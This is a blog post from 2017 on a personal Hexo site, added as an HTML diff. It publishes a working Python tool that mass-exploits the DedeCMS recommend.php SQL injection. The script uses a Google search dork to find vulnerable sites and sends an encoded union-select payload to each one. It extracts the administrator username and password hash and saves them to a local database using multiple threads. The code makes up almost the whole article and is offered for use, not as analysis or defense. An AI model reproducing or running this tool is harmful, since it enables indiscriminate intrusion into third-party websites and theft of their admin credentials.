@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8" />
+
+    
+
+    
+
+    <title>织梦 recommand 注入漏洞自动化利用工具 | TinyMagicka</title>
+    <meta name="author" content="TinyMagicka" />
+    <meta name="version" content="1.0.0" />
+    <meta name="keywords" content="Android PWN" />
+    <meta name="description" content="1234567891011121314151617#!usr/bin/env python#encoding:gbk#version:0.9#author:TinyMinimport reimport requestsimport sqlite3import urllibimport threading&amp;quot;&amp;quot;&amp;quot;本程序是织梦 dedecms recommand.php 的注入漏洞自动化利用工具。1）使用google镜像来搜索漏洞网站因此镜像可能过段时间就不管用了，那时候" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />
+    <meta name="baidu-site-verification" content="F0CXvmUgA9" />
+
+    
+    
+    <link rel="icon" href="/images/favicon.png">
+    
+
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+
+    <div class="app">
+        <header class="header clearfix">
+    <div id="nav" class="nav">
+    <button id="open-panel" class="open-panel"><i class="icon-library"></i></button>
+
+    <nav class="nav-inner">
+
+        
+        
+        <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+        </li>
+        
+        
+        
+        <li class="nav-item nav-item-tag">
+            <a id="nav-tag" class="nav-link" href="#">标签</a>
+            <div id="nav-tags" class="nav-tag-wrap">
+                <i class="nav-tag-arrow"></i>
+                
+  <div class="widget-wrap">
+    <h3 class="widget-title">
+        <i class="icon-tag vm"></i>
+        <span class="vm">Tags</span>
+    </h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/metasploit/">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwnable-tw/">pwnable.tw</a></li></ul>
+    </div>
+  </div>
+
+
+            </div>
+        </li>
+        
+        
+        
+        <li class="nav-item">
+            <a class="nav-link" href="/archives">归档</a>
+        </li>
+        
+        
+        
+        <li class="nav-item">
+            <a class="nav-link" href="/about">关于</a>
+        </li>
+        
+        
+        
+
+    </nav>
+</div>
+
+    <aside id="aside" class="aside">
+    <div id="aside-mask" class="aside-mask"></div>
+    <div id="aside-inner" class="aside-inner">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit"><i class="icon-search-stroke"></i></button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+
+        
+        
+        
+        
+
+        
+        <div class="author-meta">
+            
+            <div class="author-avatar">
+                <a href="/">
+                    <img src="/images/avatar.png" title="Sanonz">
+                </a>
+            </div>
+            
+            <div class="author-name">TinyMagicka</div>
+            <div class="author-work">Android &amp; Linux PWN</div>
+            <div class="author-location">
+                <i class="icon-location vm"></i>
+                <span class="vm">Beijing, China</span>
+            </div>
+            
+            <div class="author-thread-wrap">
+                <div class="author-threads clearfix">
+                    
+                    <a class="thread-item" href="https://github.com/TinyMagicka" target="_blank" rel="noopener"><i class="icon-github"></i></a>
+                    
+                    
+                    
+                </div>
+            </div>
+            
+        </div>
+        
+    </div>
+</aside>
+
+</header>
+
+        <div id="content" class="content"><article class="article" itemscope itemprop="blogPost">
+    
+    <header class="article-header">
+        
+        <h1 itemprop="name">
+            织梦 recommand 注入漏洞自动化利用工具
+        </h1>
+        
+        <div class="article-meta clearfix">
+            <a class="article-date" href="/2017/08/01/dedecms_recommand/">
+    
+    <i class="icon-calendar"></i>
+    
+    <time datetime="2017-08-01T06:42:55.000Z" itemprop="datePublished">2017-08-01</time>
+</a>
+
+            
+<div class="article-tag-list">
+    <i class="icon-tag"></i>
+    <a class="article-tag-link" href="/tags/php/">php</a>
+</div>
+
+
+        </div>
+    </header>
+    
+    <section class="article-body markdown-body">
+        
+        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#!usr/bin/env python</span><br><span class="line">#encoding:gbk</span><br><span class="line">#version:0.9</span><br><span class="line">#author:TinyMin</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line">import sqlite3</span><br><span class="line">import urllib</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">本程序是织梦 dedecms recommand.php 的注入漏洞自动化利用工具。</span><br><span class="line">1）使用google镜像来搜索漏洞网站因此镜像可能过段时间就不管用了，那时候只要稍作修改“使用google镜像抓取的配置信息”就行了。</span><br><span class="line">2）程序有些边界设置没有考虑，比如google搜索页数没有上限；子线程不停的进行select没有考虑到数据库记录为空的情况等；</span><br><span class="line">3）由于python的GIL锁所以python不支持真的多线程，不过本程序并不是计算密集型程序，所以这也没关系，不过最好还是多进程+协程。</span><br><span class="line">&quot;&quot;&quot;</span><br></pre></td></tr></table></figure>
+<a id="more"></a>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line">####################################################################################################</span><br><span class="line">#以下是使用google镜像抓取的配置信息</span><br><span class="line">GOOGLE_MIRROR   = &apos;https://g.chenjx.cn/&apos;</span><br><span class="line">GOOGLE_PREFIX   =&apos;search?q=&apos;</span><br><span class="line">GOOGLE_SUFFIX   =&apos;&amp;start=&apos;</span><br><span class="line">GOOGLE_KEYWORDS = &apos;intext:Powered by DedeCMS&apos;</span><br><span class="line">URL = &quot;%s%s%s%s&quot; % (GOOGLE_MIRROR, GOOGLE_PREFIX, urllib.quote(GOOGLE_KEYWORDS), GOOGLE_SUFFIX)</span><br><span class="line">HEAD = &#123;</span><br><span class="line">    &apos;Host&apos;: &apos;g.chenjx.cn&apos;,&lt;!-- more --&gt;</span><br><span class="line">    &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0&apos;,</span><br><span class="line">    &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;,</span><br><span class="line">    &apos;Accept-Language&apos;: &apos;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&apos;,</span><br><span class="line">    &apos;Accept-Encoding&apos;: &apos;gzip, deflate, br&apos;,</span><br><span class="line">    &apos;DNT&apos;: &apos;1&apos;,</span><br><span class="line">    &apos;Referer&apos;: &apos;https://g.chenjx.cn/&apos;,</span><br><span class="line">    &apos;Connection&apos;: &apos;keep-alive&apos;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#exp</span><br><span class="line">EXP_STRING = &quot;&quot;&quot;/plus/recommend.php?action=&amp;aid=1&amp;_FILES[type][tmp_name]=\\%27%20or%20mid=@`\\%27`%20/*!50000union*//*!50000select*/1,2,3,(select%20CONCAT(0x7c,userid,0x7c,pwd)+from+`%23@__admin`%20limit+0,1),5,6,7,8,9%23@`\\%27`+&amp;_FILES[type][name]=1.jpg&amp;_FILES[type][type]=application/octet-stream&amp;_FILES[type][size]=4294&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">#线程数（python不支持真多线程，不过这个程序不是计算密集型不需要多个cpu，假多线程也是可以提高效率的??，不过最好的还是多进程加协程）</span><br><span class="line">THREAD_NUMBER = 10</span><br><span class="line"></span><br><span class="line">#预处理抓取的网页，方便正则编写</span><br><span class="line">FIX = (</span><br><span class="line">    (&apos;&lt;b&gt;&apos;, &apos;&apos;),</span><br><span class="line">    (&apos;&lt;/b&gt;&apos;, &apos;&apos;),</span><br><span class="line">    (&apos;&lt;cite class=&quot;_Rm bc&quot;&gt;&apos;, &apos;&lt;cite class=&quot;_Rm&quot;&gt;&apos;)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">#从处理后的页面中抓取网页链接</span><br><span class="line">match     = re.compile(r&apos;&lt;cite class=&quot;_Rm&quot;&gt;(([0-9a-zA-Z\-_]+?\.)+\w+)/?&apos;)</span><br><span class="line"></span><br><span class="line">#抓取管理员用户名密码</span><br><span class="line">match_pwn = re.compile(r&apos;\|(.+?\|[a-z0-9]+)&lt;/h2&gt;&apos;)</span><br><span class="line"></span><br><span class="line">#goole搜索时候指定google搜索的第几页（一次+10 从0开始）</span><br><span class="line">page = 0</span><br><span class="line"></span><br><span class="line">#连接对象</span><br><span class="line">conn =False</span><br><span class="line"></span><br><span class="line">#游标对象</span><br><span class="line">cursor = False</span><br><span class="line"></span><br><span class="line">google = requests.get</span><br><span class="line"></span><br><span class="line">#线程锁</span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line">#貌似sqlite不支持多线程共享conn/cursor，所以加个锁</span><br><span class="line">def syn_execute(sql):</span><br><span class="line">    global conn</span><br><span class="line">    global cursor</span><br><span class="line">    global lock</span><br><span class="line">    lock.acquire()</span><br><span class="line">    try:</span><br><span class="line">        _ = conn.execute(sql)</span><br><span class="line">        conn.commit()</span><br><span class="line">        return _</span><br><span class="line">        #return cursor.execute(sql)</span><br><span class="line">    finally:</span><br><span class="line">        lock.release()</span><br><span class="line"></span><br><span class="line">#线程所执行的代码</span><br><span class="line">def exp(conn):</span><br><span class="line">    _ = &apos;&apos;</span><br><span class="line">    while True:</span><br><span class="line">        _ = syn_execute(&quot;SELECT URL FROM dedecms_recommand where CHECKED = 0 LIMIT 0,1&quot;).fetchall()[0][0]</span><br><span class="line">        syn_execute(&quot;UPDATE dedecms_recommand set CHECKED = 1 where URL = &apos;%s&apos;&quot;%_)</span><br><span class="line">        #print threading.currentThread(), _</span><br><span class="line">        try:</span><br><span class="line">            result = google(&apos;http://%s%s&apos;% (_, EXP_STRING) ).content</span><br><span class="line">            tmp = match_pwn.findall(result)</span><br><span class="line">            if len(tmp)&gt;0:</span><br><span class="line">                print threading.currentThread(), tmp[0]</span><br><span class="line">                syn_execute(&quot;UPDATE dedecms_recommand SET PWN = &apos;%s&apos; WHERE URL = &apos;%s&apos;&quot; % (tmp[0], _))</span><br><span class="line">        except:</span><br><span class="line">            try:</span><br><span class="line">                result = google(&apos;https://%s%s&apos;% (_, EXP_STRING) ).content</span><br><span class="line">                tmp = match_pwn.findall(result)</span><br><span class="line">                if len(tmp)&gt;0:</span><br><span class="line">                    print threading.currentThread(), tmp[0]</span><br><span class="line">                    syn_execute(&quot;UPDATE dedecms_recommand SET PWN = &apos;%s&apos; WHERE URL = &apos;%s&apos;&quot; % (tmp[0], _))</span><br><span class="line">            except:</span><br><span class="line">                print threading.currentThread(), &quot;can&apos;t get &quot;, _</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # 初始化数据库</span><br><span class="line">    global page</span><br><span class="line">    global conn</span><br><span class="line">    global cursor</span><br><span class="line">    try:</span><br><span class="line">        conn = sqlite3.connect(&quot;dedecms_recommand.db&quot;, check_same_thread = False)</span><br><span class="line">        conn.execute(&quot;&quot;&quot;</span><br><span class="line">          CREATE TABLE IF NOT EXISTS dedecms_recommand(</span><br><span class="line">          URL TEXT,</span><br><span class="line">          CHECKED INTEGER,</span><br><span class="line">          PWN TEXT);&quot;&quot;&quot;)</span><br><span class="line">        conn.commit()</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">    except:</span><br><span class="line">        print &quot;can&apos;t connect to table&quot;</span><br><span class="line">    #开启线程用来做漏洞验证</span><br><span class="line">    for i in range(THREAD_NUMBER):</span><br><span class="line">        checker = threading.Thread(target=exp, name=&apos;exp_%d&apos;%i, args = (cursor,))</span><br><span class="line">        checker.start()</span><br><span class="line"></span><br><span class="line">    #主线程用来不停的寻找可能目标</span><br><span class="line">    while True:</span><br><span class="line">        url = &quot;%s%d&quot; % (URL, page)</span><br><span class="line">        try:</span><br><span class="line">            result = google(url,headers=HEAD).content</span><br><span class="line">            for i in FIX:</span><br><span class="line">                result = result.replace(i[0], i[1])</span><br><span class="line">        except:</span><br><span class="line">            print &quot;can&apos;t google!&quot;, url</span><br><span class="line">        page += 10</span><br><span class="line">        #print zip(*match.findall(result))</span><br><span class="line">        tmp = match.findall(result)</span><br><span class="line">        if len(tmp)&lt;1: continue</span><br><span class="line">        for i in zip(*tmp)[0]:</span><br><span class="line">            sql = r&quot;SELECT * FROM dedecms_recommand WHERE URL = &apos;%s&apos;&quot; % i</span><br><span class="line">            x=syn_execute(sql).fetchall()</span><br><span class="line">            if len(x) &lt;1:</span><br><span class="line">                syn_execute(&quot;INSERT INTO dedecms_recommand(URL, CHECKED, PWN) VALUES(&apos;%s&apos;, 0, &apos;&apos;)&quot;%(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__==&apos;__main__&apos;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+        
+    </section>
+</article>
+
+
+
+<div class="comments">
+    <div id="disqus_thread">
+        <p class="comment-tips">国内查看评论需要代理~</p>
+    </div>
+    <script>
+    window.disqus_config = function () {
+        this.language = 'zh';
+        this.page.url = 'http://yoursite.com/2017/08/01/dedecms_recommand/';
+        this.page.title = '织梦 recommand 注入漏洞自动化利用工具';
+        this.page.identifier = '2017/08/01/dedecms_recommand/';
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = 'https://name.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+</div>
+        <footer class="footer">
+    Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>, Theme by <a href="https://github.com/sanonz/hexo-theme-concise" target="_blank">Concise</a>
+</footer>
+
+<script type="text/javascript" src="//s13.cnzz.com/z_stat.php?id=1234567890&amp;web_id=1234567890"></script>
+
+
+    </div>
+
+    <script type="text/javascript" src="https://cdn.bootcss.com/jquery/1.9.0/jquery.min.js"></script>
+    
+    <script type="text/javascript" src="/js/scrollspy.min.js"></script>
+    
+    <script type="text/javascript">
+        $(function() {
+            var nodes = {
+                nav: $('#nav'),
+                aside: $('#aside'),
+                navTags: $('#nav-tags')
+            };
+
+            $('#open-panel, #aside-mask').on('click', function() {
+                nodes.aside.toggleClass('panel-show');
+            });
+            $('#nav-tag').on('click', function(event) {
+                event.preventDefault();console.log(nodes.navTags.attr('class'))
+                nodes.navTags.toggleClass('tag-show');console.log(nodes.navTags.attr('class'))
+            })/*.hover(function() {
+                nodes.navTags.addClass('tag-show');
+            }, function() {
+                nodes.navTags.removeClass('tag-show');
+            });*/
+
+            
+            $(document.body).scrollspy({target: '#aside-inner'});
+            
+        });
+    </script>
+
+</body>
+</html>
